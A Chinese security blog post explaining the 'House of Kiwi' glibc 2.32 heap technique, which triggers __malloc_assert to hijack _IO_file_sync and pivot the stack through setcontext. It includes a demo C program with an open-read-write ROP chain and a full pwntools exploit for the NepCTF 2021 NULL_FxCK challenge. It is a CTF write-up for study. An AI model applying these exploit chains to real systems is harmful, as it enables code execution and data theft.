# House OF Kiwi

阅读量 **507480**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-30 14:30:45

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t016933e48a0f026951.jpg)

## House_OF_Kiwi

CTF的Pwn题里面,通常就会遇到一些加了沙盒的题目,这种加沙盒的题目,在2.29之后的堆题中,通常为以下两种方式

  1. 劫持`__free_hook`,利用特定的gadget,将栈进行迁移
  2. 劫持`__malloc_hook`为`setcontext+61`的gadget,以及劫持`IO_list_all`单链表中的指针在exit结束中,在`_IO_cleanup`函数会进行缓冲区的刷新,从而读取flag

因为`setcontext + 61`从2.29之后变为由RDX寄存器控制寄存器了,所以需要控制RDX寄存器的指向的位置的部分数据

    
    
    <setcontext+61>:    mov    rsp,QWORD PTR [rdx+0xa0]
    <setcontext+68>:    mov    rbx,QWORD PTR [rdx+0x80]
    <setcontext+75>:    mov    rbp,QWORD PTR [rdx+0x78]
    <setcontext+79>:    mov    r12,QWORD PTR [rdx+0x48]
    <setcontext+83>:    mov    r13,QWORD PTR [rdx+0x50]
    <setcontext+87>:    mov    r14,QWORD PTR [rdx+0x58]
    <setcontext+91>:    mov    r15,QWORD PTR [rdx+0x60]
    <setcontext+95>:    test   DWORD PTR fs:0x48,0x2
    <setcontext+107>:    je     0x7ffff7e31156 <setcontext+294>
    ->
    <setcontext+294>:    mov    rcx,QWORD PTR [rdx+0xa8]
    <setcontext+301>:    push   rcx
    <setcontext+302>:    mov    rsi,QWORD PTR [rdx+0x70]
    <setcontext+306>:    mov    rdi,QWORD PTR [rdx+0x68]
    <setcontext+310>:    mov    rcx,QWORD PTR [rdx+0x98]
    <setcontext+317>:    mov    r8,QWORD PTR [rdx+0x28]
    <setcontext+321>:    mov    r9,QWORD PTR [rdx+0x30]
    <setcontext+325>:    mov    rdx,QWORD PTR [rdx+0x88]
    <setcontext+332>:    xor    eax,eax
    <setcontext+334>:    ret
    

###  缺点

但是如果将exit函数替换成`_exit`函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用`_IO_cleanup`,若再将`__malloc_hook`和`__free_hook`给ban了,且在输入和输出都用read和write的情况下,无法hook且无法通过IO刷新缓冲区进行调用,这时候就涉及到ptmalloc源码里面了

###  使用场景

  1. 能够触发`__malloc_assert`,通常是堆溢出导致
  2. 能够任意写,修改`_IO_file_sync`和`IO_helper_jumps + 0xA0 and 0xA8`  

####  __malloc_assert

  * GLIBC 2.32/malloc.c:288  
glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个fflush(stderr)的函数调用,其中会调用`_IO_file_jumps`中的sync指针

    
        static void
    __malloc_assert (const char *assertion, const char *file, unsigned int line,
           const char *function)
    {
    (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
               __progname, __progname[0] ? ": " : "",
               file, line,
               function ? function : "", function ? ": " : "",
               assertion);
    fflush (stderr);
    abort ();
    }
    

如何触发assert?在`_int_malloc`中存在一个 assert (chunk_main_arena
(bck->bk));位置可以触发,此外当`top_chunk`的大小不够分配时,则会进入sysmalloc中

  * GLIBC 2.32/malloc.c:2394 
    
        ......
    assert ((old_top == initial_top (av) && old_size == 0) ||
            ((unsigned long) (old_size) >= MINSIZE &&
             prev_inuse (old_top) &&
             ((unsigned long) old_end & (pagesize - 1)) == 0));
    ......
    

此处会对top_chunk的`size|flags`进行assert判断

    1. old_size >= 0x20;
    2. old_top.prev_inuse = 0;
    3. old_top页对齐

通过这里也可以触发assert  
下面手动实现进入assert后,可以想到fflush和fxprintf都和IO有关,可能需要涉及IO,一步步调试看看可以发现在`fflush`函数中调用到了一个指针:位于`_IO_file_jumps`中的`_IO_file_sync`指针,且观察发现RDX寄存器的值为`IO_helper_jumps`指针,多次调试发现RDX始终是一个固定的地址

![](https://p5.ssl.qhimg.com/t01f675c08902cf9575.png)

如果存在一个任意写,通过修改 `_IO_file_jumps + 0x60`的`_IO_file_sync`指针为`setcontext+61`  
修改`IO_helper_jumps + 0xA0 and 0xA8`分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移

###  Demo

一个简单的演示用的DEMO

    
    
    // Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2
    //gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    #include <assert.h>
    #include <unistd.h>
    #include <sys/prctl.h>
    #include <linux/filter.h>
    #include <linux/seccomp.h>
    #define pop_rdi_ret libc_base + 0x000000000002858F
    #define pop_rdx_r12 libc_base + 0x0000000000114161
    #define pop_rsi_ret libc_base + 0x000000000002AC3F
    #define pop_rax_ret libc_base + 0x0000000000045580
    #define syscall_ret libc_base + 0x00000000000611EA
    #define ret pop_rdi_ret+1
    size_t libc_base;
    size_t ROP[0x30];
    char FLAG[0x100] = "./flag.txt\x00";
    void sandbox()
    {
        prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
        struct sock_filter sfi[] ={
            {0x20,0x00,0x00,0x00000004},
            {0x15,0x00,0x05,0xC000003E},
            {0x20,0x00,0x00,0x00000000},
            {0x35,0x00,0x01,0x40000000},
            {0x15,0x00,0x02,0xFFFFFFFF},
            {0x15,0x01,0x00,0x0000003B},
            {0x06,0x00,0x00,0x7FFF0000},
            {0x06,0x00,0x00,0x00000000}
        };
        struct sock_fprog sfp = {8, sfi};
        prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &sfp);
    }
    
    void setROP()
    {
        uint32_t i = 0;
        ROP[i++] = pop_rax_ret;
        ROP[i++] = 2;
        ROP[i++] = pop_rdi_ret;
        ROP[i++] = (size_t)FLAG;
        ROP[i++] = pop_rsi_ret;
        ROP[i++] = 0;
        ROP[i++] = syscall_ret;
        ROP[i++] = pop_rdi_ret;
        ROP[i++] = 3;
        ROP[i++] = pop_rdx_r12;
        ROP[i++] = 0x100;
        ROP[i++] = 0;
        ROP[i++] = pop_rsi_ret;
        ROP[i++] = (size_t)(FLAG + 0x10);
        ROP[i++] = (size_t)read;
        ROP[i++] = pop_rdi_ret;
        ROP[i++] = 1;
        ROP[i++] = (size_t)write;
    }
    int main() {
        setvbuf(stdin,0LL,2,0LL);
        setvbuf(stdout,0LL,2,0LL);
        setvbuf(stderr,0LL,2,0LL);
        sandbox();
        libc_base  = ((size_t)setvbuf) - 0x81630;
        printf("LIBC:\t%#lx\n",libc_base);
    
        size_t magic_gadget = libc_base + 0x53030 + 61; // setcontext + 61
        size_t IO_helper = libc_base + 0x1E48C0; // _IO_hel
        per_jumps;
        size_t SYNC = libc_base + 0x1E5520; // sync pointer in _IO_file_jumps
        setROP();
        *((size_t*)IO_helper + 0xA0/8) = ROP; // 设置rsp
        *((size_t*)IO_helper + 0xA8/8) = ret; // 设置rcx 即 程序setcontext运行完后会首先调用的指令地址
        *((size_t*)SYNC) = magic_gadget; // 设置fflush(stderr)中调用的指令地址
        // 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert
        size_t *top_size = (size_t*)((char*)malloc(0x10) + 0x18);
        *top_size = (*top_size)&0xFFE; // top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在
        malloc(0x1000); // 触发assert
        _exit(-1);
    }
    

###  实际利用

以NepCTF 2021年中NULL_FxCK为例  
程序实现了一个简单的增删查改功能,在edit的时候存在一个`off by null`的漏洞利用,因为环境是GLIBC 2.32,其中tcache
chunk的fd进行了一个异或处理  
所以此前通过`tcache bin`、`fastbin` 以及 `large bin`共同进行的`fake chunk`的伪造不可行,下面则是

  * 仅large bin chunk的堆块伪造,并即可实现堆块重叠
  * 并large bin attack 任意写攻击TLS结构体中的存放tcache结构体指针的位置,从而可以伪造tcache bin结构体进行任意构造
  * 再通过上述demo任意写控制参数,从而在assert后即可进行栈迁移

    
    
    from pwn import*
    context.binary = './main'
    def menu(ch):
        p.sendlineafter('>> ',str(ch))
    def New(size,content):
        menu(1)
        p.sendlineafter('Size: ',str(size))
        p.sendafter('Content: ',content)
    def Modify(index,content):
        menu(2)
        p.sendlineafter('Index: ',str(index))
        p.sendafter('Content: ',content)
    def Show(index):
        menu(4)
        p.sendlineafter('Index: ',str(index))
    def Free(index):
        menu(3)
        p.sendlineafter('Index: ',str(index))
    
    libc = ELF('./libc-2.32.so')
    while True:
        p = remote('node2.hackingfor.fun',38734)
        try:
            New(0x2000,'FMYY')
            New(0x1000,'FMYY')
            New(0x2000 - 0x2F0 - 0x600,'FMYY')
            New(0x4F0,'FMYY') #3
            New(0x108,'FMYY')
            New(0x500,'FMYY') #5
            New(0x108,'FMYY') #6 - 7 -8
            New(0x108,'FMYY')
            New(0x108,'FMYY')
            New(0x510,'FMYY') #9
            New(0x108,'FMYY') 
            New(0x4F0,'FMYY') #11
            New(0x108,'FMYY') #12
            Free(3)
            Free(5)
            Free(9)
            New(0x2000,'FMYY')
            Free(3)
            New(0x500,'\x00'*8 + p64(0xE61)) # 3
            New(0x4F0,'\x00'*8+ '\x10\x00') # 5
    
            Free(11)
            New(0x800,'FMYY') # 9
            Free(9)
            New(0x510,'\x10\x00') #9
            New(0x4F0,'\x00'*0x20) #11
    
            Modify(10,'\x00'*0x100 + p64(0xE60))
            Free(11)
            New(0x4F0,'FMYY') # to split the unsorted bin chunk
            New(0x1000,'FMYY')
            Show(6)
            libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 1648 - 0x10 - libc.sym['__malloc_hook']
            log.info('LIBC:\t' + hex(libc_base))
            Show(9)
            heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x49F0
            log.info('HEAP:\t' + hex(heap_base))
            ############################
            SROP_address = heap_base + 0x79F0
            magic = libc_base + 0x1EB538
            main_arena = libc_base + libc.sym['__malloc_hook'] + 0x10
            pop_rdi_ret = libc_base + 0x000000000002858F
            pop_rdx_r12 = libc_base + 0x0000000000114161
            pop_rsi_ret = libc_base + 0x000000000002AC3F
            pop_rax_ret = libc_base + 0x0000000000045580
            syscall_ret = libc_base + 0x00000000000611EA
            malloc_hook = libc_base + libc.sym['__malloc_hook']
    
    
            frame = SigreturnFrame()
            frame.rsp = heap_base + 0x7A90 + 0x58
            frame.rip = pop_rdi_ret + 1
    
            Open = libc_base + libc.symbols["open"]
            Read = libc_base + libc.symbols["read"]
            Write = libc_base + libc.symbols['write']
    
            orw  = ''
            orw += p64(pop_rax_ret) + p64(2)
            orw += p64(pop_rdi_ret)+p64(heap_base + 0x7B78)
            orw += p64(pop_rsi_ret)+p64(0)
            orw += p64(syscall_ret)
            orw += p64(pop_rdi_ret) + p64(3)
            orw += p64(pop_rdx_r12) + p64(0x100) + p64(0)
            orw += p64(pop_rsi_ret) + p64(heap_base + 0x10000)
            orw += p64(Read)
            orw += p64(pop_rdi_ret)+p64(1)
            orw += p64(Write)
            orw += './flag.txt\x00\x00'
            IO_helper_jumps = libc_base + 0x1E38C0
            ###################################
            New(0x130,'\x00'*0x108 + p64(0x4B1)) #14
            New(0x440,'FMYY') #15
            New(0x8B0,'\x00'*0x20 + p64(0x21)*8) #16
            New(0x430,'FMYY') #17
            New(0x108,'FMYY') #18
            Free(15)
            ######
            New(0x800,'FMYY')
            Free(15)
            ######
            Free(7)
            New(0x4A0,'\x00'*0x28 + p64(0x451) + p64(main_arena + 1120)*2 + p64(heap_base + 0x6650) + p64(magic - 0x20))
            Free(17)
            New(0x800,str(frame) + orw)
            Free(15)
    
            New(0x430,'FMYY')
            Free(7)
            New(0x4A0,'\x00'*0x30 + '\x01'*0x90 + p64(libc_base + 0x1E54C0 + 0x60)*0x10 + p64(libc_base + 0x1E48C0 + 0xA0)*0x10)
            Free(0)
            Free(1)
    
            New(0x108,p64(libc_base + libc.sym['setcontext'] + 61))
            New(0x208,str(frame)[0xA0:])
            menu(1)
            p.sendafter('Size:',str(0x428))
            break
        except:
            p.close()
    p.interactive()
    

## 总结

主要是相对于之前的两种方法而言,运用要简单需要,平常喜欢IO的一些知识,偶然发现的,侵删;

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Refrain** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/235598](/post/id/235598)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [ptmalloc](/tag/ptmalloc)

 **+1** __19赞

 __收藏

![](https://p2.ssl.qhimg.com/t011e5e8b059ae4989c.png) Refrain

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

